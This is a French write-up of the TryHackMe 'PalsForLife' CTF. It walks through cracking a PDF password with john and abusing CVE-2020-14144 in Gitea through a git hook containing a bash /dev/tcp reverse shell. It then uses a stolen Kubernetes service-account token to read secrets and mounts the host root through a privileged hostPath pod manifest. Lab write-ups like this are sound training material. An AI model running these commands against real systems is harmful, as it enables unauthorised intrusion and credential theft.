# Writeup PalsForLife

<ins>Plateforme</ins>: **TryHackMe**\
<ins>Nom</ins>: **PalsForLife**\
<ins>Difficulté</ins>: **Medium**\
<ins>Infos</ins>: **security, kubernetes, ctf, john**

## Recon | NMAP
![image](https://user-images.githubusercontent.com/68467919/153236316-c3cf620f-c40b-40d4-813c-0e2977ab2a1d.png)

En effectuant un scan de la machine, nous découvrons plusieurs ports. Pour le début de l'audit, je vais me concentrer sur le port **31111** et **30180**.
Le port 31111 héberge un système de gestion, **Gitea** et l'autre un serveur **Nginx**.

## Port 31111 | GITEA

Après m'être inscris sur Gitea, je tombe sur ce profil : 

![image](https://user-images.githubusercontent.com/68467919/153236908-b1663efb-89d0-46a2-ad40-4de5dcc05898.png)

Notons que cet utilisateur s'appelle "leeroy" et que son mail est leeroy@jenki.ns.

## Port 30180 | NGINX

![image](https://user-images.githubusercontent.com/68467919/153238415-152381af-a2fb-4bbb-b735-2ac7f30ddae1.png)

### Source

![image](https://user-images.githubusercontent.com/68467919/153238575-7f727c97-d979-4154-9b39-954c77c5f09f.png)

Intéressant, l'ID de la div s'appelle "uninteresting_file.pdf" suivi par du base64. Décodons ça sur CyberChef pour voir ce que cela donne.

![image](https://user-images.githubusercontent.com/68467919/153239259-15ccd497-a28d-4c23-9d3a-e413a2f88077.png)

Sans grande surprise, le base64 décodé est un fichier pdf. En créant un fichier .pdf avec la string décodé, nous pourrions peut-être l'ouvrir et voir son contenu?

![image](https://user-images.githubusercontent.com/68467919/153239732-c9792b53-32c6-4708-9e1e-32c84b8986ff.png)

Malheureusement, le fichier est protégé par un mot de passe. L'utilisation du script pdf2john.pl et de john pourraient nous aider à cracker le mot de passe.\
La première étape est de récupérer le hash du pdf en utilisant la commande :
```bash 
pdf2john.pl your_file.pdf > pdf
```
Vérifions notre fichier "pdf"
```
cat pdf
file.pdf:$pdf$5*6*256*-4*1*16*88ad00a9681ee7aedef1a78f402d6561*48*d64d0b238fbc4121148f2b9160146b30c32782714497083a2bbad81c74fdbaf522d2fda56661ef9f20d2713857484658*48*01196fa933adcf7610161370c5d096b40da833e0786aa09f81b8f4aee1d5bbf41f34b5f6ae55b85d811c07d321961744*32*82968e9e8581965d9612aefa3a379f6f690dd61ca377e6f72f9e27ed359bceab*32*38e2bdc42b33bc60f8e90d816900777069fefffca17acbf9f1ac3975db469f24
```
Puis crackons le hash 
```
john --wordlist=/home/r0s3/SecLists/Passwords/Leaked-Databases/rockyou.txt pdf
````
![image](https://user-images.githubusercontent.com/68467919/153241250-da6817bf-ce48-4384-9944-1ae9e010cebe.png)

Parfait, le mot de passe est donc chickenlegs (cool comme mot de passe non?)\
En ouvrant le PDF, voici ce qui apparait : 

![image](https://user-images.githubusercontent.com/68467919/153241961-3e18e272-ae7d-4625-9901-1f29b0c56e8f.png)

Peut-être que nous devrions tester de nous connecter avec l'utilisateur leeroy sur Gitea avec ce "mot de passe"?

![image](https://user-images.githubusercontent.com/68467919/153242377-32846368-60b2-46a6-8ab5-d60462d10c53.png)

## Flag 1 

<ins>Hint</ins> : *Must be hidden somewhere in the web tool*

L'utilisateur Leeroy possède un repo privé, mais rien d'intéressant à l'intérieur mis à part un readme.md. \
J'ai changé l'owner du repo, mais ça n'a servi à rien. En regardant les paramètres du repo, nous pouvons voir que l'input "secret" possède des caractères. Allons jeter un coup d'oeil dans le code source.
![image](https://user-images.githubusercontent.com/68467919/153243203-05fdae85-1f3e-488a-9dad-1d5bafcd398e.png)
![image](https://user-images.githubusercontent.com/68467919/153244075-a0913b11-9570-4ce5-917d-30fa9a39f5fd.png)

## Reverse-Shell | CVE-2020-14144 
(https://podalirius.net/fr/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/)

Cette vulnérabilité nous permet de pouvoir créer un Hook qui exécutera un script shell après avoir reçu un nouveau commit.
```bash
#!/bin/bash
bash -i >& /dev/tcp/[your_ip]/[your_port] 0>&1 &
```
![image](https://user-images.githubusercontent.com/68467919/153244989-5eece4b2-e031-4662-b4cf-0aa8999946fc.png)

## Flag2 

<ins>Hint</ins> : *Get a shell* 

Rien de bien spécial pour avoir ce flag, il suffit juste d'obtenir un reverse-shell et d'aller dans le répertoire root.
![image](https://user-images.githubusercontent.com/68467919/153245401-e44d535b-effd-45c6-b50e-a71c56a7ceae.png)

## Kubernetes 

Essayons donc d'élever nos privilèges. Le challenge est basé sur Kubernetes, il serait peut-être donc judicieux de fouiller vers ce côté là. Après un peu d'énumération, nous trouvons dans le répetoire /run/secrets/kubernetes.io/serviceaccount/ trois fichiers.\
Le premier est un certificat, le deuxième est un token et le dernier est le fichier namespace

Grâce à kubectl ou curl, nous pourrions essayer d'énumerer les différents pod.\
Je préfère utiliser kubectl pour accéder au cluster, car beaucoup plus rapide pour taper les commandes après l'avoir config ! 

```bash
kubectl config set-cluster cfc --server=https://[ip]:6443 --certificate-authority=ca.crt
kubectl config set-context cfc --cluster=cfc
kubectl config set-credentials user={token}
kubectl config set-context cfc --user=user
kubectl config use-context cfc
```
Nous pouvons donc lister les pods, ainsi que les secrets !\
Grâce à la commande

```bash
kubectl get secrets -n kube-system
```
Nous pouvons voir les objets contenus dans kube-system.

![image](https://user-images.githubusercontent.com/68467919/153248250-e91d62cf-ff16-4b18-b1c7-d5cf3ac0dac7.png) 

## Flag3

<ins>Hint</ins>: *kubectl*

![image](https://user-images.githubusercontent.com/68467919/153248925-63a28564-6091-4dd5-a333-43dbf3c00b05.png)

Le flag numéro 3 était donc dans kube-system. Nous pouvons donc lire les données dans l'objet en les affichant au format YAML grâce à la commande

```bash
kubectl get secrets flag3 -n kubesystem -o yaml
```
## Flag4

<ins>Hint</ins>: *Can we reuse a node image?* 

Avant toutes choses, nous devrions vérifier ce que nous pouvons faire avec kubectl.
![image](https://user-images.githubusercontent.com/68467919/153250282-8a95742d-808d-4629-9f05-30cb51a096c3.png)

Il est possible pour moi, de créer un pod. L'hint nous indique qu'il serait sûrement possible de réutiliser l'image d'un pod déjà existant.\
Je vais réutiliser l'image d'NGINX et modifier le payload déjà existant sur Hacktricks pour par la suite créer un nouveau pod qui me permettra de pouvoir monter le répertoire root. 

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
spec:
  volumes:
  - name: host
    hostPath:
      path: /
  containers:
  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750 
    name: attacker-pod
    command: ["/bin/sh", "-c", "--"]
    args: ["while true; do sleep 30; done;"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host
      mountPath: /host
  restartPolicy: Never

```
![image](https://user-images.githubusercontent.com/68467919/153259593-fe015e21-a493-4aed-afa3-f8ceab3aeb8a.png)


### Notes personnelles

J'ai trouvé ce CTF très intéressant et un peu compliqué à la fois. C'est l'un de mes premiers challenges où je suis confronté à Kubernetes. J'ai appris pas mal de nouvelles choses même si ce n'était pas évident !


### Ressources


https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216 \
https://rioasmara.com/2021/09/18/kubernetes-yaml-for-reverse-shell-and-map-root/ \
https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/enumeration-from-a-pod \
https://stackoverflow.com/questions/31870222/how-can-i-keep-a-container-running-on-kubernetes \
https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216
https://unit42.paloaltonetworks.com/unsecured-kubernetes-instances/
